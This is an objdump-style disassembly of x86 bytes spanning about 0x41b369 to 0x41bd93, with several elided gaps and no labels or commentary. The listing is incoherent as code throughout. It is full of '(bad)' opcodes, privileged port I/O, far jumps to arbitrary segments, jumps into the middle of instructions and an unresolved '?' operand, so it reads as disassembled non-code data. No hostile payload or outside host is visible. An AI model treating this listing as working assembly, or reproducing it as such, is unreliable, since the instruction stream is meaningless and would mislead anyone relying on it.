  41b369:	add    ebp,DWORD PTR ds:[ebp-0x45]
  41b36d:	std    
  41b36e:	push   ebp
  41b36f:	cmp    DWORD PTR [eax-0x361bf44f],0x32425180
  41b379:	mov    al,BYTE PTR [esi]
  41b37b:	(bad)  
  41b37c:	push   ss
  41b37d:	cwde   
  41b37e:	les    ebp,FWORD PTR [eax+esi*2]
  41b381:	inc    esp
  41b382:	inc    ecx
  41b383:	push   ecx
  41b384:	dec    eax
  41b385:	js     0x41b3f4
  41b387:	es test al,0x2e
  41b38a:	push   esp
  41b38b:	out    0xe9,al
  41b38d:	(bad)  
  41b38e:	call   0xa99043bb
  41b393:	lods   eax,DWORD PTR ds:[esi]
  41b394:	(bad)  
  41b395:	mov    esp,0xac51b213
  41b39a:	sbb    bh,0xdc
  41b39d:	push   0xcc78fa31
  41b3a2:	cmp    al,BYTE PTR [edx*4+0x24c2e8c4]
  41b3a9:	add    DWORD PTR [edx-0x3c5e84ea],ecx
  41b3af:	add    al,0x3f
  41b3b1:	gs mov edx,0x64ff77f5
  41b3b7:	call   0x379f9171
  41b3bc:	cld    
  41b3bd:	mov    al,0xaf
  41b3bf:	xor    eax,0xc16d
	...
  41b434:	mov    edi,0xff0fcf82
  41b439:	dec    edi
  41b43a:	push   DWORD PTR [edx-0x33ef3aa9]
  41b440:	outs   dx,BYTE PTR ds:[esi]
  41b441:	pop    esi
  41b442:	in     al,0xb4
  41b444:	in     al,0x26
  41b446:	add    DWORD PTR [eax],eax
  41b448:	test   BYTE PTR [eax],0x0
  41b44b:	add    bl,ch
  41b44d:	or     DWORD PTR [ecx-0x29],0x10eb5466
  41b454:	inc    eax
  41b455:	jp     0x41b457
  41b457:	xchg   edi,eax
  41b458:	dec    ecx
  41b459:	sbb    DWORD PTR [ebx+0x5e],0x3158f507
  41b460:	pop    ds
  41b461:	jbe    0x41b411
  41b463:	pop    ss
  41b464:	sub    DWORD PTR [ebp-0xb],0xfffffff7
  41b468:	lock pop esp
  41b46a:	ss retf 
  41b46c:	xchg   edx,eax
  41b46d:	sub    DWORD PTR [ecx-0x45],ebp
  41b470:	inc    ebp
  41b471:	cmp    cl,BYTE PTR [ecx-0x70ba9438]
  41b477:	pop    ds
  41b478:	pop    edi
  41b479:	and    dh,bl
  41b47b:	enter  0x94f5,0xf2
  41b47f:	outs   dx,BYTE PTR ds:[esi]
  41b480:	lds    ebp,FWORD PTR [edx-0x32]
  41b483:	aad    0x53
  41b485:	cmp    dl,BYTE PTR [ecx-0x57]
  41b488:	test   DWORD PTR [ebx+0x3eaac018],edi
  41b48e:	dec    esi
  41b48f:	jnp    0x41b47e
  41b491:	lock push ebp
  41b493:	pop    ebp
  41b494:	mov    esp,0xbb088892
  41b499:	ja     0x41b461
  41b49b:	mov    edi,0x4e5d2f1b
  41b4a0:	pop    edi
  41b4a1:	mov    edi,0x2482d72
  41b4a6:	cmp    al,0x54
  41b4a8:	xchg   ebx,eax
  41b4a9:	xchg   BYTE PTR [eax],bl
  41b4ab:	pop    edi
  41b4ac:	sahf   
  41b4ad:	popf   
  41b4ae:	enter  0x219f,0x66
  41b4b2:	jae    0x41b52d
  41b4b4:	popa   
  41b4b5:	inc    esp
  41b4b6:	std    
  41b4b7:	mov    esi,0xbcc1a46f
  41b4bc:	inc    ecx
  41b4bd:	test   BYTE PTR [edi-0x13de2e5c],al
  41b4c3:	leave  
  41b4c4:	jg     0x41b4b7
  41b4c6:	mov    ds:0xb1d85187,eax
  41b4cb:	stos   DWORD PTR es:[edi],eax
  41b4cc:	dec    ebx
  41b4cd:	push   ds
  41b4ce:	outs   dx,BYTE PTR ds:[esi]
  41b4cf:	stos   DWORD PTR es:[edi],eax
  41b4d0:	push   ds
  41b4d1:	jo     0x41b54f
  41b4d3:	push   es
  41b4d4:	xor    DWORD PTR [eax+0x23106217],0x6e73f455
  41b4de:	xchg   esp,eax
  41b4df:	ret    
  41b4e0:	push   esp
  41b4e1:	jmp    0x41b46c
  41b4e3:	jmp    0x1791:0x5d745da2
  41b4ea:	cmp    eax,0x1d235599
  41b4ef:	mov    al,ds:0x3911a36a
  41b4f4:	scas   al,BYTE PTR es:[edi]
  41b4f5:	dec    edx
  41b4f6:	call   DWORD PTR es:[eax+ecx*8]
  41b4fa:	sbb    ah,cl
  41b4fc:	in     al,dx
  41b4fd:	repz ds pop esi
  41b500:	retf   
  41b501:	pop    ds
  41b502:	cmc    
  41b503:	rcl    DWORD PTR [ebx],cl
  41b505:	lods   eax,DWORD PTR ds:[esi]
  41b506:	mov    di,0xec7a
  41b50a:	mov    ds:0xa3f049a7,eax
  41b50f:	mov    WORD PTR [esi],ds
  41b511:	(bad)  
  41b512:	push   ecx
  41b513:	add    BYTE PTR [ebp-0x4fcf216b],cl
  41b519:	jnp    0x41b4b7
  41b51b:	jmp    0x28111c10
  41b520:	lahf   
  41b521:	fstp   DWORD PTR [eax]
  41b523:	test   BYTE PTR [ebx+0x43],cl
  41b526:	mov    esp,0xaf387312
  41b52b:	mov    WORD PTR [edi-0x11],?
  41b52e:	icebp  
  41b52f:	pushf  
  41b530:	setle  bl
  41b533:	xchg   edi,eax
  41b534:	aas    
  41b535:	outs   dx,DWORD PTR ds:[esi]
  41b536:	push   es
  41b537:	mov    al,ds:0x455e392e
  41b53c:	cdq    
  41b53d:	pop    es
  41b53e:	jbe    0x41b527
  41b540:	enter  0x64,0x0
	...
  41b5b4:	pop    esp
  41b5b5:	sub    al,BYTE PTR [ecx]
  41b5b7:	inc    ecx
  41b5b8:	ja     0x41b625
  41b5ba:	pop    esp
  41b5bb:	aas    
  41b5bc:	pop    ecx
  41b5bd:	pop    esi
  41b5be:	inc    eax
  41b5bf:	adc    al,0x93
  41b5c1:	mov    DWORD PTR [edi+0x43],ecx
  41b5c4:	fisub  DWORD PTR [edi]
  41b5c6:	add    DWORD PTR [eax],eax
  41b5c8:	test   BYTE PTR [eax],0x0
  41b5cb:	add    BYTE PTR [edi-0x49d0bf8a],dl
  41b5d1:	ins    BYTE PTR es:[edi],dx
  41b5d2:	mov    bl,0x68
  41b5d4:	sti    
  41b5d5:	lea    ecx,[ecx-0xd39fc2b]
  41b5db:	sub    ebx,DWORD PTR [edi]
  41b5dd:	adc    al,0x7b
  41b5df:	repnz sub eax,0xa720fcb5
  41b5e5:	stc    
  41b5e6:	fwait
  41b5e7:	adc    ch,BYTE PTR [ebx+eiz*1+0x45cb2ad8]
  41b5ee:	jmp    0x6dd6:0xa9c08068
  41b5f5:	out    0xc7,al
  41b5f7:	mov    dh,0xf9
  41b5f9:	(bad)  
  41b5fa:	rol    BYTE PTR [edx-0x4282b56a],cl
  41b600:	mov    ch,BYTE PTR [edi]
  41b602:	adc    BYTE PTR [eax+0x13],cl
  41b605:	or     edi,ebp
  41b607:	xchg   esp,eax
  41b608:	out    0x79,eax
  41b60a:	xor    esp,ebp
  41b60c:	popf   
  41b60d:	cmp    eax,0xc178d1a9
  41b612:	mov    bh,0x10
  41b614:	jle    0x41b614
  41b616:	enter  0x5eb6,0xc5
  41b61a:	push   edx
  41b61b:	das    
  41b61c:	aad    0x68
  41b61e:	and    al,0x78
  41b620:	cmp    eax,0x24028e99
  41b625:	sbb    DWORD PTR [ecx],edi
  41b627:	xchg   edx,eax
  41b628:	sahf   
  41b629:	jb     0x41b63e
  41b62b:	(bad)  
  41b62d:	inc    esi
  41b62e:	xchg   esi,eax
  41b62f:	push   eax
  41b630:	daa    
  41b631:	in     al,dx
  41b632:	mov    cl,0x6e
  41b634:	in     eax,0xd5
  41b636:	adc    al,0x41
  41b638:	fcmovnbe st,st(6)
  41b63a:	inc    ebp
  41b63b:	ret    0xd615
  41b63e:	cld    
  41b63f:	daa    
  41b640:	xor    BYTE PTR [eax-0x204a878a],dl
  41b646:	stc    
  41b647:	ja     0x41b693
  41b649:	addr16 mov dh,0x77
  41b64c:	mov    ebp,0x9a6734d7
  41b651:	and    DWORD PTR [esi+0x5f],esp
  41b654:	adc    ch,BYTE PTR [edi-0x56dfbce4]
  41b65a:	push   cs
  41b65b:	lods   al,BYTE PTR ds:[esi]
  41b65c:	lock push ebx
  41b65e:	pop    ebx
  41b65f:	mov    ebp,0x879b5544
  41b664:	clc    
  41b665:	push   esp
  41b666:	in     al,0x8b
  41b668:	sbb    al,0x37
  41b66a:	add    al,BYTE PTR [edi-0x6eb5c7e8]
  41b670:	dec    edx
  41b671:	adc    al,0x4c
  41b673:	idiv   BYTE PTR [ecx+0x2f676841]
  41b679:	push   ebx
  41b67a:	push   edi
  41b67b:	scas   al,BYTE PTR es:[edi]
  41b67c:	inc    edi
  41b67d:	sbb    DWORD PTR [eax+0x73],ebx
  41b680:	lds    edi,FWORD PTR [edi+ebp*8]
  41b683:	sub    BYTE PTR [esi],0x8c
  41b686:	push   edx
  41b687:	mov    ch,0x83
  41b689:	and    DWORD PTR [ebp-0x74],eax
  41b68c:	push   ebp
  41b68d:	or     al,0x2e
  41b68f:	cmp    BYTE PTR [esi-0x5137c454],dh
  41b695:	mov    al,0x27
  41b697:	add    ah,0xe2
  41b69a:	mov    edx,0x3cdb7f70
  41b69f:	ret    
  41b6a0:	jno    0x41b628
  41b6a2:	test   BYTE PTR [ecx],0x29
  41b6a5:	xor    dh,BYTE PTR [edi]
  41b6a7:	enter  0x27fd,0xbe
  41b6ab:	mov    ah,0xa5
  41b6ad:	xchg   edx,eax
  41b6ae:	fdiv   DWORD PTR [ebx+0x15]
  41b6b1:	daa    
  41b6b2:	mov    bh,0xb1
  41b6b4:	xchg   ebx,eax
  41b6b5:	add    eax,0x366ec55f
  41b6ba:	pop    edx
  41b6bb:	push   cs
  41b6bc:	repnz adc BYTE PTR [ecx+0x33],bl
  41b6c0:	fcom   st(7)
	...
  41b732:	add    BYTE PTR [eax],al
  41b734:	repz xchg edi,eax
  41b736:	jae    0x41b6bf
  41b738:	ja     0x41b721
  41b73a:	div    edi
  41b73c:	dec    eax
  41b73d:	lods   eax,DWORD PTR ds:[esi]
  41b73e:	push   es
  41b73f:	mov    ch,bh
  41b741:	mov    ch,0xc7
  41b743:	retf   0x28d0
  41b746:	add    DWORD PTR [eax],eax
  41b748:	test   BYTE PTR [eax],0x0
  41b74b:	add    BYTE PTR [edi+0x50],cl
  41b74e:	ja     0x41b72d
  41b750:	sbb    cl,0x36
  41b753:	mov    ch,0xb4
  41b755:	inc    eax
  41b756:	xor    eax,0x42a4f5e8
  41b75b:	dec    edi
  41b75c:	dec    ebp
  41b75d:	xor    BYTE PTR [ebx+0x47],al
  41b760:	test   ch,0x28
  41b763:	daa    
  41b764:	add    dh,BYTE PTR [eax-0x14]
  41b767:	jg     0x41b79f
  41b769:	cwde   
  41b76a:	cmp    BYTE PTR [ebx-0x38],ah
  41b76d:	mov    eax,ds:0xe5b3499b
  41b772:	pushf  
  41b773:	sbb    cl,BYTE PTR [ebx]
  41b775:	xchg   ebx,eax
  41b776:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b777:	push   0x83d753ca
  41b77c:	imul   eax,esi,0x98d710b9
  41b782:	test   DWORD PTR [esi],edi
  41b784:	(bad)  
  41b785:	push   cs
  41b786:	adc    eax,DWORD PTR [ebp+0x486c20e3]
  41b78c:	retf   
  41b78d:	jno    0x41b797
  41b78f:	daa    
  41b790:	outs   dx,DWORD PTR ds:[esi]
  41b791:	imul   ebx,DWORD PTR [edx],0x65
  41b794:	mov    eax,0xc15474d7
  41b799:	(bad)  
  41b79a:	pop    esp
  41b79b:	jmp    0x972694d5
  41b7a0:	ja     0x41b783
  41b7a2:	push   ds
  41b7a3:	test   al,0x88
  41b7a5:	lahf   
  41b7a6:	lods   eax,DWORD PTR ds:[esi]
  41b7a7:	mov    al,0x7f
  41b7a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7aa:	cld    
  41b7ab:	mov    al,BYTE PTR [ebx]
  41b7ad:	push   DWORD PTR [edi+0x30d0d21f]
  41b7b3:	dec    edx
  41b7b4:	frstor [ecx]
  41b7b6:	sbb    BYTE PTR [ecx],ah
  41b7b8:	push   ss
  41b7b9:	push   edx
  41b7ba:	(bad)  
  41b7bc:	adc    dl,BYTE PTR [ecx+0x717e3867]
  41b7c2:	pop    ds
  41b7c3:	push   edi
  41b7c4:	shl    cl,cl
  41b7c6:	nop
  41b7c7:	sub    edi,ebp
  41b7c9:	and    al,0xcd
  41b7cb:	rcl    BYTE PTR [eax+0x5d],0x78
  41b7cf:	les    eax,FWORD PTR [edi]
  41b7d1:	stos   DWORD PTR es:[edi],eax
  41b7d2:	inc    esi
  41b7d3:	push   ebp
  41b7d4:	loopne 0x41b796
  41b7d6:	clc    
  41b7d7:	pop    es
  41b7d8:	stc    
  41b7d9:	pop    DWORD PTR [esp+esi*4-0x72]
  41b7dd:	popf   
  41b7de:	jne    0x41b7d7
  41b7e0:	sti    
  41b7e1:	stos   DWORD PTR es:[edi],eax
  41b7e2:	xchg   ebp,eax
  41b7e3:	sub    al,BYTE PTR [esi-0x32cccacf]
  41b7e9:	mov    ah,0x4d
  41b7eb:	ja     0x41b805
  41b7ed:	pop    ss
  41b7ee:	aam    0x42
  41b7f0:	pop    es
  41b7f1:	fwait
  41b7f2:	ja     0x41b779
  41b7f4:	push   esi
  41b7f5:	xlat   BYTE PTR ds:[ebx]
  41b7f6:	int3   
  41b7f7:	ins    DWORD PTR es:[edi],dx
  41b7f8:	or     BYTE PTR [eax-0x3d],ch
  41b7fb:	pop    ecx
  41b7fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7fd:	int3   
  41b7fe:	das    
  41b7ff:	cmp    eax,0x3dc33c28
  41b804:	mov    DWORD PTR [esi-0x3839d28a],eax
  41b80a:	xchg   ebp,eax
  41b80b:	retf   
  41b80c:	xor    cx,cx
  41b80f:	and    DWORD PTR [edi+0xa],ebp
  41b812:	and    al,0x8c
  41b814:	cmp    cl,ah
  41b816:	iret   
  41b817:	push   0xffffffe7
  41b819:	sub    DWORD PTR [ebx+0x256a0e14],eax
  41b81f:	and    eax,0xa15f6c32
  41b824:	mov    ah,0x63
  41b826:	cmp    DWORD PTR [edx],esp
  41b828:	pop    esp
  41b829:	not    BYTE PTR [ecx]
  41b82b:	mov    ah,0xa8
  41b82d:	lods   al,BYTE PTR ds:[esi]
  41b82e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b82f:	std    
  41b830:	jo     0x41b802
  41b832:	or     DWORD PTR [edx+0x63],ebp
  41b835:	mov    dl,0xe
  41b837:	mov    cl,0xa7
  41b839:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b83a:	push   ebp
  41b83b:	jbe    0x41b848
  41b83d:	repnz mov al,0x7a
  41b840:	xor    al,0xf9
	...
  41b8b2:	add    BYTE PTR [eax],al
  41b8b4:	xor    eax,0xcf4a867e
  41b8b9:	cli    
  41b8ba:	std    
  41b8bb:	jg     0x41b85c
  41b8bd:	into   
  41b8be:	jno    0x41b916
  41b8c0:	fdivr  DWORD PTR [ecx]
  41b8c2:	pop    ecx
  41b8c3:	or     esi,eax
  41b8c5:	sub    DWORD PTR [ecx],eax
  41b8c7:	add    dh,dh
  41b8c9:	add    BYTE PTR [eax],al
  41b8cb:	add    BYTE PTR [ebp+0x23362988],bl
  41b8d1:	cld    
  41b8d2:	dec    ecx
  41b8d3:	cld    
  41b8d4:	pop    esp
  41b8d5:	imul   edx,DWORD PTR [ebp+0xd],0x60fde140
  41b8dc:	pop    ecx
  41b8dd:	adc    DWORD PTR [ebx+0x8],ecx
  41b8e0:	pop    ebx
  41b8e1:	les    eax,FWORD PTR [eax-0x27]
  41b8e4:	arpl   WORD PTR ds:0x536d1df0,si
  41b8ea:	imul   eax,DWORD PTR [ebx-0x128b1d86],0xffffff8c
  41b8f1:	mov    eax,ds:0xd84664a6
  41b8f6:	aaa    
  41b8f7:	cdq    
  41b8f8:	xlat   BYTE PTR ds:[ebx]
  41b8f9:	cdq    
  41b8fa:	cld    
  41b8fb:	sbb    DWORD PTR [edi+eax*4-0x62cf353e],esp
  41b902:	push   cs
  41b903:	shl    DWORD PTR [eax*2+0x370ede36],1
  41b90a:	jns    0x41b897
  41b90c:	call   0x7b857cfe
  41b911:	add    al,0x2e
  41b913:	or     al,0xd7
  41b915:	push   ebx
  41b916:	inc    edx
  41b917:	push   es
  41b918:	cdq    
  41b919:	aam    0x5d
  41b91b:	(bad)  
  41b91d:	popa   
  41b91e:	cwde   
  41b91f:	cdq    
  41b920:	adc    DWORD PTR [esi],0x3e
  41b923:	test   DWORD PTR [ebx-0x13330cce],ebx
  41b929:	xlat   BYTE PTR ds:[ebx]
  41b92a:	cdq    
  41b92b:	sbb    eax,0xb76b0c65
  41b930:	mov    edx,0x2abe90b3
  41b935:	push   cs
  41b936:	sub    BYTE PTR [eax],0xee
  41b939:	sbb    DWORD PTR ds:0xce17372c,ebp
  41b93f:	xor    DWORD PTR [ebx-0x28b5e1d2],esp
  41b945:	xor    bl,BYTE PTR [eax]
  41b947:	lds    edi,FWORD PTR [esi-0x27]
  41b94a:	or     esp,DWORD PTR [ebp+0x5e2f16d2]
  41b950:	aad    0xcc
  41b952:	xchg   ecx,eax
  41b953:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b954:	int    0x0
  41b956:	add    edx,esi
  41b958:	ja     0x41b93b
  41b95a:	icebp  
  41b95b:	push   edi
  41b95c:	out    0xaf,eax
  41b95e:	pushf  
  41b95f:	cmp    BYTE PTR [ecx+esi*8-0x1fb1800],ah
  41b966:	(bad)  
  41b967:	test   al,0x33
  41b969:	retf   0x4dba
  41b96c:	pop    eax
  41b96d:	inc    eax
  41b96e:	stos   DWORD PTR es:[edi],eax
  41b96f:	pop    esi
  41b970:	push   edx
  41b971:	jge    0x41b9e1
  41b973:	adc    edi,DWORD PTR [ebp+eiz*2-0x15c76797]
  41b97a:	jns    0x41b9a0
  41b97c:	jb     0x41b96e
  41b97e:	xor    BYTE PTR [ebx-0x7c8ef45b],dl
  41b984:	enter  0xe8be,0x33
  41b988:	sub    BYTE PTR [ebp-0x7f],cl
  41b98b:	and    eax,0xeefb6118
  41b990:	outs   dx,BYTE PTR ds:[esi]
  41b991:	adc    al,0x69
  41b993:	fbstp  TBYTE PTR [esi+0x39]
  41b996:	or     al,0x71
  41b998:	ror    BYTE PTR [edx+esi*4-0x16],cl
  41b99c:	or     BYTE PTR [edi-0x7e],ch
  41b99f:	jge    0x41b9fb
  41b9a1:	mov    esp,0xbfadd112
  41b9a6:	stos   BYTE PTR es:[edi],al
  41b9a7:	adc    cl,BYTE PTR [edx-0x20]
  41b9aa:	mov    fs,WORD PTR [edi-0x539c25f3]
  41b9b0:	lods   eax,DWORD PTR ds:[esi]
  41b9b1:	bound  edx,QWORD PTR [esi+0x18]
  41b9b4:	daa    
  41b9b5:	push   es
  41b9b6:	lods   al,BYTE PTR ds:[esi]
  41b9b7:	jp     0x41ba25
  41b9b9:	cwde   
  41b9ba:	fs cmc 
  41b9bc:	out    0x94,al
  41b9be:	cmc    
  41b9bf:	nop
  41b9c0:	fs push edx
	...
  41ba32:	add    BYTE PTR [eax],al
  41ba34:	test   DWORD PTR [ecx],0xfdfeb4dc
  41ba3a:	inc    DWORD PTR [ebx-0x11]
  41ba3d:	sub    ecx,DWORD PTR [edx]
  41ba3f:	pop    edi
  41ba40:	cmp    BYTE PTR [edi+0x2abc0fda],dl
  41ba46:	add    DWORD PTR [eax],eax
  41ba48:	test   BYTE PTR [eax],0x0
  41ba4b:	add    ah,cl
  41ba4d:	sub    BYTE PTR [ecx],al
  41ba4f:	mov    ebp,0xf94f5cd0
  41ba54:	std    
  41ba55:	das    
  41ba56:	int    0xab
  41ba58:	into   
  41ba59:	mov    dh,0xe0
  41ba5b:	mov    edi,0x7f16e09d
  41ba60:	stos   BYTE PTR es:[edi],al
  41ba61:	xchg   BYTE PTR [ebx-0x19],dh
  41ba64:	xchg   ecx,eax
  41ba65:	inc    esp
  41ba66:	test   eax,0x39e93e70
  41ba6b:	xchg   ebp,eax
  41ba6c:	aaa    
  41ba6d:	cli    
  41ba6e:	sahf   
  41ba6f:	adc    BYTE PTR [edx+0x1a],dh
  41ba72:	out    dx,al
  41ba73:	ins    BYTE PTR es:[edi],dx
  41ba74:	mov    cl,0x1b
  41ba76:	pop    ss
  41ba77:	cmc    
  41ba78:	js     0x41ba8e
  41ba7a:	in     al,0x25
  41ba7c:	xor    edi,ebp
  41ba7e:	stos   BYTE PTR es:[edi],al
  41ba7f:	test   DWORD PTR [ebx+0x634a75d2],0xd29a795d
  41ba89:	pop    ebx
  41ba8a:	cmp    al,0x93
  41ba8c:	inc    ebx
  41ba8d:	shr    DWORD PTR [ecx],cl
  41ba8f:	cli    
  41ba90:	js     0x41ba40
  41ba92:	jns    0x41baaf
  41ba94:	(bad)  
  41ba96:	and    eax,0xf26dc69d
  41ba9b:	inc    esi
  41ba9c:	fwait
  41ba9d:	imul   esp,DWORD PTR ds:0xd7f2b919,0x6ddf4efa
  41baa7:	inc    esi
  41baa8:	ss push ds
  41baaa:	xor    eax,0xcd53bbda
  41baaf:	popf   
  41bab0:	pop    ds
  41bab1:	setne  bl
  41bab4:	mul    BYTE PTR [esi+0x1f]
  41bab7:	push   edx
  41bab8:	jno    0x41bad0
  41baba:	add    DWORD PTR [edx-0x3340bcd7],esi
  41bac0:	dec    eax
  41bac1:	mov    ecx,0x8167b5e6
  41bac6:	iret   
  41bac7:	xchg   BYTE PTR [ebx+eax*4],al
  41baca:	inc    ebx
  41bacb:	sbb    DWORD PTR [ecx],esi
  41bacd:	cdq    
  41bace:	dec    ebx
  41bacf:	pop    edx
  41bad0:	mov    ecx,0x9ca2dd94
  41bad5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bad6:	mov    esi,0x82bffe91
  41badb:	push   edx
  41badc:	or     eax,ebx
  41bade:	adc    eax,0xa265307b
  41bae3:	outs   dx,DWORD PTR ds:[esi]
  41bae4:	sbb    al,0x6d
  41bae6:	or     DWORD PTR [edx-0x4a740f86],0x5daefecc
  41baf0:	push   edi
  41baf1:	sub    dh,bl
  41baf3:	aaa    
  41baf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41baf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41baf6:	push   ebx
  41baf7:	(bad)  
  41baf9:	bound  edi,QWORD PTR [ebx-0x67]
  41bafc:	dec    ecx
  41bafd:	cli    
  41bafe:	or     DWORD PTR [eax-0x661fb43],0xffd7bfc
  41bb08:	cdq    
  41bb09:	add    BYTE PTR [ebx+0x76b225e1],0xbd
  41bb10:	shl    esi,0xbd
  41bb13:	xchg   esp,eax
  41bb14:	mov    ah,0xe7
  41bb16:	pop    es
  41bb17:	lahf   
  41bb18:	data16 cli 
  41bb1a:	je     0x41bacb
  41bb1c:	inc    esp
  41bb1d:	je     0x41bad6
  41bb1f:	mov    ebp,0x76009e8f
  41bb24:	pusha  
  41bb25:	loopne 0x41bb56
  41bb27:	scas   eax,DWORD PTR es:[edi]
  41bb28:	adc    DWORD PTR [esi-0x6e],edi
  41bb2b:	mov    cl,0x98
  41bb2d:	sub    al,0x9
  41bb2f:	retf   0x6f7b
  41bb32:	add    al,0x34
  41bb34:	mov    dh,0x12
  41bb36:	sbb    al,0xdc
  41bb38:	(bad)  
  41bb39:	mov    eax,0x58b6cab3
  41bb3e:	fldenv [edi-0x6f]
  41bb41:	fadd   DWORD PTR [eax]
	...
  41bbb3:	add    BYTE PTR [edx+0x49],ch
  41bbb6:	es cmp al,0x27
  41bbb9:	jg     0x41bc35
  41bbbb:	pop    edi
  41bbbc:	xor    DWORD PTR [edx+edi*2],0x3a
  41bbc0:	out    dx,eax
  41bbc1:	xor    al,0xa8
  41bbc3:	out    dx,eax
  41bbc4:	mov    dl,0x2b
  41bbc6:	add    DWORD PTR [eax],eax
  41bbc8:	test   BYTE PTR [eax],0x0
  41bbcb:	add    BYTE PTR [ebp+0x5dcb810],ah
  41bbd1:	cmp    dl,dh
  41bbd3:	into   
  41bbd4:	out    0x96,eax
  41bbd6:	pop    eax
  41bbd7:	dec    edx
  41bbd8:	adc    DWORD PTR ds:0xfd0d1cdd,ecx
  41bbde:	cmp    dl,BYTE PTR [ecx-0x1e039c71]
  41bbe4:	cdq    
  41bbe5:	mov    al,ds:0x4a2d4eda
  41bbea:	sbb    BYTE PTR [ebx-0x2ef03586],dh
  41bbf0:	inc    ecx
  41bbf1:	jecxz  0x41bb79
  41bbf3:	lods   al,BYTE PTR ds:[esi]
  41bbf4:	adc    al,0x69
  41bbf6:	xchg   esp,eax
  41bbf7:	ret    
  41bbf8:	or     esp,DWORD PTR [ebx]
  41bbfa:	fsubr  QWORD PTR [edi]
  41bbfc:	bound  edx,QWORD PTR [ebp-0x4cdb46df]
  41bc02:	cli    
  41bc03:	sub    dl,BYTE PTR [ecx-0xc867c8f]
  41bc09:	fdiv   QWORD PTR [edx+ebx*4-0x55]
  41bc0d:	jne    0x41bbae
  41bc0f:	sbb    BYTE PTR [ecx+0x11],cl
  41bc12:	fadd   DWORD PTR [esi+0x5b8b1900]
  41bc18:	fwait
  41bc19:	popa   
  41bc1a:	mov    ch,0x1b
  41bc1c:	sbb    eax,0x2def00f2
  41bc21:	shr    esi,cl
  41bc23:	into   
  41bc24:	sbb    ch,BYTE PTR [ebp+0x23]
  41bc27:	test   eax,0xb4464a9c
  41bc2c:	sub    DWORD PTR [esi+0x79],ecx
  41bc2f:	dec    esp
  41bc30:	test   BYTE PTR ds:0x3fdd7642,ah
  41bc36:	cmp    DWORD PTR [edx],esi
  41bc38:	ins    BYTE PTR es:[edi],dx
  41bc39:	pop    ecx
  41bc3a:	imul   ebp,DWORD PTR [ebp+0x45],0xa8edf299
  41bc41:	xchg   esi,eax
  41bc42:	aam    0x91
  41bc44:	(bad)  
  41bc45:	ss test al,0x2c
  41bc48:	pushf  
  41bc49:	cli    
  41bc4a:	xchg   esp,eax
  41bc4b:	int3   
  41bc4c:	mov    ecx,DWORD PTR [esp+ecx*2+0x56]
  41bc50:	fisubr WORD PTR [esp+ebp*4]
  41bc53:	and    esi,DWORD PTR [edi]
  41bc55:	mov    ecx,0xe6fc2102
  41bc5a:	mov    ebx,0xa3442654
  41bc5f:	or     al,0xa1
  41bc61:	lds    esi,FWORD PTR [eax+0x97ef738]
  41bc67:	xchg   ebp,eax
  41bc68:	adc    BYTE PTR [ebx-0x42],cl
  41bc6b:	cmp    ebp,DWORD PTR [edi-0x52]
  41bc6e:	dec    ebx
  41bc6f:	push   esp
  41bc70:	cmc    
  41bc71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc72:	cmp    BYTE PTR [edi+0x40398a09],bl
  41bc78:	mov    al,0x66
  41bc7a:	add    al,0x7b
  41bc7c:	ds clc 
  41bc7e:	fstp   TBYTE PTR [edx-0x313a5a59]
  41bc84:	jo     0x41bc10
  41bc86:	retf   
  41bc87:	or     DWORD PTR [eax],0x3681990e
  41bc8d:	cmp    eax,0xc443fb26
  41bc92:	xchg   edx,esp
  41bc94:	inc    ebp
  41bc95:	clc    
  41bc96:	sar    BYTE PTR [ecx-0x13ad0f8],0xda
  41bc9d:	cs adc edi,ecx
  41bca0:	xchg   esp,edi
  41bca2:	icebp  
  41bca3:	cwde   
  41bca4:	test   al,0xb3
  41bca6:	lahf   
  41bca7:	stos   DWORD PTR es:[edi],eax
  41bca8:	mov    bl,0x41
  41bcaa:	lahf   
  41bcab:	xor    DWORD PTR [edx+0x1c],esp
  41bcae:	push   cs
  41bcaf:	dec    edi
  41bcb0:	mov    DWORD PTR [edi-0x7269cc33],esi
  41bcb6:	jae    0x41bcb3
  41bcb8:	call   0xdc61:0xa1b70ef5
  41bcbf:	imul   eax,DWORD PTR [edx],0x1d
	...
  41bd32:	add    BYTE PTR [eax],al
  41bd34:	push   ebp
  41bd35:	clc    
  41bd36:	or     DWORD PTR [esi-0x4280053],ebx
  41bd3c:	cmp    eax,0x26bf1c9a
  41bd41:	imul   DWORD PTR [ebx]
  41bd43:	inc    edi
  41bd44:	test   al,0x2c
  41bd46:	add    DWORD PTR [eax],eax
  41bd48:	test   BYTE PTR [eax],0x0
  41bd4b:	add    ch,dl
  41bd4d:	or     al,BYTE PTR [ecx+0x9]
  41bd50:	sbb    al,0x12
  41bd52:	push   ebx
  41bd53:	cdq    
  41bd54:	push   ss
  41bd55:	pop    edi
  41bd56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd57:	mov    ch,0x74
  41bd59:	in     al,0x27
  41bd5b:	pushf  
  41bd5c:	js     0x41bda6
  41bd5e:	xchg   esi,eax
  41bd5f:	add    al,0x5f
  41bd61:	xor    dh,BYTE PTR [edi-0x20]
  41bd64:	loopne 0x41bcea
  41bd66:	mov    bh,0x18
  41bd68:	or     edx,DWORD PTR [ebx]
  41bd6a:	scas   eax,DWORD PTR es:[edi]
  41bd6b:	iret   
  41bd6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd6d:	cmp    eax,0x92b79336
  41bd72:	jl     0x41bda4
  41bd74:	daa    
  41bd75:	mov    esp,0x474868ec
  41bd7a:	int3   
  41bd7b:	or     DWORD PTR [ecx-0x6e],edx
  41bd7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd7f:	or     BYTE PTR [ebx+0x540db40c],bl
  41bd85:	cdq    
  41bd86:	pop    eax
  41bd87:	out    dx,al
  41bd88:	jmp    0x41bda1
  41bd8a:	leave  
  41bd8b:	int3   
  41bd8c:	fdivr  QWORD PTR [ecx+0x552a3e13]
  41bd92:	pop    ss
  41bd93:	ret    0x3f4c
